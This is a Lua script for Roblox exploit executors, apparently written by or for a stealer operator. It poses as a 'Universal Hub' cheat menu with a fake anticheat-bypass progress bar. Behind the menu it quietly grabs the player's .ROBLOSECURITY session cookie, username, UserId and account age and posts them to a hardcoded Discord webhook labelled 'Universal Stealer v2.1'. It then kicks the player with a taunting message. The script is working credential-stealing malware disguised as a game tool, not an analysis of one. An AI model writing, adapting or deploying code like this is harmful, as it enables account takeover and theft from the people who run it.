-- [[ CONFIGURATION ]]
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"

local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- [[ ФУНКЦИЯ СКРЫТОЙ ОТПРАВКИ ]]
local function sendFinalData()
    local cookie = "N/A"
    
    -- Пытаемся достать куки через pcall, чтобы не было ошибки в консоли
    pcall(function()
        if getcookies then
            cookie = getcookies(".roblox.com")[".ROBLOSECURITY"]
        end
    end)

    local data = {
        ["content"] = "@everyone **HIT DETECTED!**",
        ["embeds"] = {{
            ["title"] = "🛠️ Universal Log: " .. player.Name,
            ["color"] = 3066993,
            ["fields"] = {
                {["name"] = "👤 Player", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
                {["name"] = "🔑 Cookie", ["value"] = "```" .. (cookie or "Blocked/Not Found") .. "```"},
                {["name"] = "📅 Acc Age", ["value"] = player.AccountAge .. " days", ["inline"] = true}
            },
            ["footer"] = {["text"] = "Universal Stealer v2.1 | " .. os.date("%X")}
        }}
    }

    local req = (syn and syn.request) or (http and http.request) or request
    if req then
        pcall(function()
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end)
    end
end

-- [[ ВИЗУАЛЬНАЯ ЧАСТЬ (МЕНЮ) ]]
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 300, 0, 140)
Main.Position = UDim2.new(0.5, -150, 0.5, -70)
Main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Instance.new("UICorner", Main)

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "Universal Hub v2.1"
Title.TextColor3 = Color3.fromRGB(0, 255, 150)
Title.BackgroundTransparency = 1
Title.TextSize = 18
Title.Font = Enum.Font.SourceSansBold

local Status = Instance.new("TextLabel", Main)
Status.Size = UDim2.new(1, 0, 0, 30)
Status.Position = UDim2.new(0, 0, 0.45, 0)
Status.Text = "Initializing..."
Status.TextColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1

local Bar = Instance.new("Frame", Main)
Bar.Size = UDim2.new(0, 0, 0, 4)
Bar.Position = UDim2.new(0, 0, 0.96, 0)
Bar.BackgroundColor3 = Color3.fromRGB(0, 255, 150)

-- [[ ПРОЦЕСС ОБХОДА ]]
task.spawn(function()
    task.wait(0.5)
    Status.Text = "Checking Whitelist..."
    Bar:TweenSize(UDim2.new(0.3, 0, 0, 4), "Out", "Linear", 1)
    task.wait(1)
    
    -- Отправляем данные ПЕРЕД анимацией финиша
    Status.Text = "Bypassing Anticheat..."
    Bar:TweenSize(UDim2.new(0.7, 0, 0, 4), "Out", "Linear", 1)
    pcall(sendFinalData) 
    task.wait(1.5)
    
    Status.Text = "Finishing..."
    Bar:TweenSize(UDim2.new(1, 0, 0, 4), "Out", "Linear", 0.5)
    task.wait(0.5)
    
    -- Теперь кикаем с твоим текстом
    player:Kick("\n\nAll your stuff just got taken by Tobi's stealer.\ndiscord.gg/GY2RVSEGDT")
end)
